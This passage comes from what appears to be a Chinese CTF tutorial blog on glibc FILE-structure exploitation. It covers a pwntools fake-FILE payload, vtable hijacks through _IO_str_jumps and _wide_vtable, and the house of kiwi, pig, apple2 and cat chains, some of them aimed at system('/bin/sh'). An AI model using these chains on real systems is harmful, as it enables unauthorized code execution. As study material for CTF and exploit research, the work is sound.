class="number">0</span>)  <span class="comment"># _IO_read_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_base</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_base</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_base;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span>  <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>])  <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_file += p32(<span class="number">2</span>)  <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_file += p16(<span class="number">0</span>)  <span class="comment"># _cur_column</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span>  <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_file += <span class="string">b&quot;\n&quot;</span>  <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># padding</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1ea0</span>)  <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _offset, -1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x160</span>)  <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span>  <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_file += p32(<span class="number">0xFFFFFFFF</span>)  <span class="comment"># _mode, usually -1</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span>  <span class="comment"># _unused2</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0x10</span>)  <span class="comment"># fake vtable</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h2 id="缓冲区利用未完善">缓冲区利用(未完善)</h2>
<h3 id="stdin">stdin</h3>
<h4 id="任意地址写">任意地址写</h4>
<h3 id="stdout">stdout</h3>
<h4 id="任意地址写-1">任意地址写</h4>
<h4 id="任意地址读">任意地址读</h4>
<h2 id="io_str_jumpsunder-2.27">__IO_str_jumps(under 2.27)</h2>
<ul>
<li><p>利用<code>_IO_str_jumps</code>或<code>__IO_wstr_jumps</code>填入<code>vtable</code>绕过<code>IO_validate_vtable</code>检查</p></li>
<li><p>确定<code>_IO_str_jumps</code>地址</p>
<ul>
<li>由于<code>_IO_str_jumps</code>不是导出符号，<code>libc.sym["_IO_str_jumps"]</code>查不到，可以利用<code>_IO_str_jumps</code>中的导出函数例如 <code>_IO_str_underflow</code>进行辅助定位</li>
<li>首先先得到<code>_IO_str_underflow</code>地址，然后查找所有指向该地址的指针</li>
<li>由于<code>_IO_str_underflow</code>在<code>_IO_str_jumps</code>的偏移为<code>0x20</code>，并且<code>_IO_str_jumps</code>的地址大于<code>_IO_file_jumps</code>地址，因此可以在选择满足上述条件中最小的地址作为<code>_IO_str_jumps</code>的地址 <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">IO_file_jumps = libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow = libc.symbols[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">IO_str_underflow_ptr = <span class="built_in">list</span>(libc.search(p64(IO_str_underflow)))</span><br><span class="line">IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + <span class="number">0x20</span>)] - <span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(IO_str_jumps))</span><br></pre></td></tr></table></figure></div></li>
</ul></li>
<li><p>劫持<code>io_str_finish</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p></li>
<li><p>将<code>vatble</code>指针修改为指向<code>&amp;_IO_str_jumps - 8</code>的地址就可以执行<code>_IO_str_finish</code></p></li>
<li><p><code>fp-&gt;_IO_buf_base</code>不为空，并且作为<code>fp-&gt;_s._free_buffer</code>的第一个参数，因此可以使用<code>/bin/sh</code>的地址</p></li>
<li><p><code>fp-&gt;_flags</code>要不包含<code>_IO_USER_BUF</code>，它的定义为<code>#define _IO_USER_BUF 1</code>，即<code>fp-&gt;_flags</code>最低位为0</p></li>
<li><p><code>_IO_write_base &lt; _IO_write_ptr</code>，<code>_mode &lt;= 0</code></p></li>
<li><p>修改<code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code>为<code>system</code>地址，即将<code>fp+0xE8</code>处的值改为<code>system</code>地址</p></li>
<li><p>执行<code>_IO_flush_all_lockp</code></p></li>
</ul>
<h2 id="堆利用结合">堆利用结合</h2>
<h3 id="leak-libc">leak libc</h3>
<h4 id="libc-2.23">libc-2.23</h4>
<ul>
<li><code>fastbin attack</code> 在 <code>_IO_2_1_stdout_-0x43</code> 处申请 <code>fastbin</code></li>
<li>修改<code>_IO_write_base</code>指针的最低 1 字节使其指向<code>_chain</code>变量，而<code>_chain</code>变量中存储了<code>_IO_2_1_stdin_</code>结构体地址，程序在下一次输出内容时会先将 <code>write buf</code> 中的内容输出出来</li>
</ul>
<h4 id="vtable-1">vtable</h4>
<ul>
<li><code>fastbin attack</code>在<code>_IO_2_1_stdout_+157</code>地址处申请<code>0x60</code>大小的堆块</li>
<li>修改<code>vtable</code>指针指向事先伪造的<code>vtable(*(vtable+0x10)=system_addr)</code>，在调用IO函数时会将<code>_IO_2_1_stdout_</code>结构体指针作为参数传入<code>vtable</code>中的函数，因此可以在<code>_IO_2_1_stdout_</code>结构体<code>flag</code>字段之后的 4 字节填充中写入<code>;sh;</code></li>
</ul>
<h3 id="house-of-orange-1">house of orange</h3>
<p>见attack ### house of husk 见attack ### house of kiwi(under 2.36) * 在没有<code>exit</code>下调用<code>vtable</code> <code>sysmalloc</code>： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure></div> <code>__malloc_assert</code>： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 利用<code>fflush</code>中的<code>_IO_fflush</code>，会调用<code>call [rbp + 0x60]</code>，<code>rbp</code>指向<code>_IO_file_jumps_</code>，调用的是<code>_IO_new_file_sync</code>，并且<code>_IO_file_jumps_</code>可写，因此只需要将<code>_IO_file_jumps_</code>对应<code>_IO_new_file_sync</code>函数指针的位置覆盖为<code>one_gadget</code>就可以获取</p>
<h5 id="setcontext61">setcontext+61</h5>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000050C0D mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000050C14 mov     rbx, [rdx+80h]</span><br><span class="line">.text:0000000000050C1B mov     rbp, [rdx+78h]</span><br><span class="line">.text:0000000000050C1F mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000050C23 mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000050C27 mov     r14, [rdx+58h]</span><br><span class="line">.text:0000000000050C2B mov     r15, [rdx+60h]</span><br><span class="line">.text:0000000000050C2F test    dword ptr fs:48h, 2</span><br><span class="line">.text:0000000000050C3B jz      loc_50CF6</span><br><span class="line">...</span><br><span class="line">.text:0000000000050CF6 loc_50CF6:                              ; CODE XREF: setcontext+6B↑j</span><br><span class="line">.text:0000000000050CF6 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:0000000000050CFD push    rcx</span><br><span class="line">.text:0000000000050CFE mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000050D02 mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000050D06 mov     rcx, [rdx+98h]</span><br><span class="line">.text:0000000000050D0D mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000050D11 mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000050D15 mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000050D15 ; &#125; // starts at 50BD0</span><br><span class="line">.text:0000000000050D1C ; __unwind &#123;</span><br><span class="line">.text:0000000000050D1C xor     eax, eax</span><br><span class="line">.text:0000000000050D1E retn</span><br></pre></td></tr></table></figure></div>
<p>调用<code>_IO_new_file_sync</code>时<code>rdx</code>指向的是<code>_IO_helper_jumps_</code>结构，可以通过修改<code>_IO_helper_jumps_</code>中的内容来给寄存器赋值</p>
<p>以<code>rop</code>方法为例，需要设置<code>rsp</code>指向提前布置号的<code>rop</code>的起始位置，同时设置<code>rip</code>指向<code>ret</code> 指令</p>
<p>如果存在一个任意写,通过修改 <code>_IO_file_jumps + 0x60</code>的<code>_IO_file_sync</code>指针为<code>setcontext+61</code> 修改<code>IO_helper_jumps + 0xA0 and 0xA8</code>分别为可迁移的存放有<code>ROP</code>的位置和<code>ret</code>指令的<code>gadget</code>位置，则可以进行栈迁移</p>
<h3 id="house-of-pig仍可以任意写">house of pig(仍可以任意写)</h3>
<ul>
<li>起码<code>UAF</code></li>
</ul>
<ol type="1">
<li>先用<code>UAF</code>漏洞泄露<code>libc、heap</code></li>
<li>再用<code>UAF</code>修改<code>largebin</code>内<code>chunk</code>的<code>fd_nextsize</code>和<code>bk_nextsize</code>位置，完成一次<code>largebin attack</code>，将一个堆地址写到<code>__free_hook-0x8</code>的位置，使得满足之后的<code>tcache stashing unlink attack</code>需要目标<code>fake chunk</code>的<code>bk</code>位置内地址可写的条件</li>
<li>先构造同一大小的<code>5</code>个<code>tcache</code>，继续用<code>UAF</code>修改该大小的<code>smallbin</code>内<code>chunk</code>的<code>fd、bk</code>位置，完成一次<code>tcache stashing unlink attack</code>，由于前一步已经将一个可写的堆地址，写到了<code>__free_hook-0x8</code>，所以可以将<code>__free_hook-0x10</code>的位置当作一个<code>fake chunk</code>，放入到<code>tcache</code>链表的头部，但是由于没有 <code>malloc</code>，我们无法将他申请出来</li>
<li>最后再用<code>UAF</code>修改<code>largebin</code>内<code>chunk</code>的<code>fd_nextsize</code>和<code>bk_nextsize</code>位置，完成第二次<code>largebin attack</code>，将一个堆地址写到<code>_IO_list_all</code>的位置，从而在程序退出前<code>fflush</code>所有<code>IO</code>流的时候，将该堆地址当作一个<code>FILE</code>结构体，我们就能在该堆地址的位置来构造任意<code>FILE</code>结构了</li>
<li>在该堆地址构造<code>FILE</code>结构的时候，重点是将其<code>vtable</code>由<code>_IO_file_jumps</code>修改为<code>_IO_str_jumps</code>，那么当原本应该调用<code>IO_file_overflow</code>的时候，就会转而调用如下的<code>IO_str_overflow</code>，而该函数是以传入的<code>FILE</code>地址本身为参数的，同时其中会连续调用<code>malloc、memcpy、free</code>函数，且三个函数的参数又都可以被该<code>FILE</code>结构中的数据控制。那么适当的构造<code>FILE</code>结构中的数据，就可以实现利用<code>IO_str_overflow</code>函数中的<code>malloc</code>申请出那个已经被放入到<code>tcache</code>链表的头部的包含<code>__free_hook</code>的<code>fake chunk</code>；紧接着可以将提前在堆上布置好的数据，通过<code>IO_str_overflow</code>函数中的<code>memcpy</code>写入到刚刚申请出来的包含<code>__free_hook</code>的这个<code>chunk</code>，从而能任意控制<code>__free_hook</code>，这里可以将其修改为 <code>system</code>函数地址；最后调用<code>IO_str_overflow</code>函数中的<code>free</code>时，就能够触发<code>__free_hook</code>，同时还能在提前布置堆上数据的时候，使其以字符串<code>/bin/sh\x00</code>开头，那么最终就会执行<code>system(“/bin/sh”)</code></li>
</ol>
<h3 id="house-of-emma未完善">house of emma(未完善)</h3>
<h3 id="house-of-apple2-house-of-cat">house of apple2 | house of cat</h3>
<ul>
<li>漏洞产生：<code>_wide_data</code>结构中有一个类似<code>vtable</code>的<code>_wide_vtable</code>指向<code>_IO_jump_t</code>结构，与<code>vtable</code>相同，对<code>glibc</code>中也定义了调用<code>_wide_vtable</code>中函数的宏，其中在 glibc 中真正使用到的有<code>_IO_WSETBUF、_IO_WUNDERFLOW、_IO_WDOALLOCATE</code>，但与<code>vtable</code>不同的是这三个宏均缺少对<code>_wide_vtable</code>位置的检查 <code>_IO_OVERFLOW</code>： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure></div> 而<code>_IO_WOVERFLOW</code>： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="io_wfile_overflow"><code>_IO_wfile_overflow</code></h4>
<ul>
<li>调用链</li>
</ul>
<ol type="1">
<li><code>_IO_wfile_overflow</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wdoallocbuf (f);<span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 满足条件：</li>
</ol>
<ul>
<li><code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code></li>
<li><code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code></li>
<li><code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></li>
</ul>
<ol start="2" type="1">
<li><code>_IO_wdoallocbuf</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class="comment">// _IO_WXXXX调用</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">             fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure></div> 满足条件：</li>
</ol>
<ul>
<li><code>fp-&gt;_wide_data-&gt;_IO_buf_base == 0</code></li>
<li><code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code></li>
</ul>
<ol start="3" type="1">
<li><p><code>_IO_WDOALLOCATE</code></p></li>
<li><p><code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p></li>
</ol>
<p>综上所述： * <code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>;sh;</code> * <code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可 * <code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code> * <code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code> * <code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code> * <code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code> * <code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></p>
<h4 id="io_wfile_underflow_mmap"><code>_IO_wfile_underflow_mmap</code></h4>
<ul>
<li>调用链</li>
</ul>
<ol type="1">
<li><code>_IO_wfile_underflow_mmap</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 满足条件：</li>
</ol>
<ul>
<li><code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code></li>
<li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code></li>
<li><code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code></li>
<li><code>fp-&gt;_wide_data-&gt;_IO_buf_base == NULL，fp-&gt;_wide_data-&gt;_IO_save_base == NULL</code></li>
</ul>
<ol start="2" type="1">
<li><p><code>_IO_wdoallocbuf</code></p></li>
<li><p><code>_IO_WDOALLOCATE</code></p></li>
<li><p><code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p></li>
</ol>
<p>综上所述： * <code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>;sh;</code> * <code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow_mmap</code>即可 * <code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code> * <code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code> * <code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code> * <code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code> * <code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code> * <code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code> * <code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></p>
<h4 id="io_wdefault_xsgetn"><code>_IO_wdefault_xsgetn</code></h4>
<ul>
<li>调用链</li>
</ul>
<ol type="1">
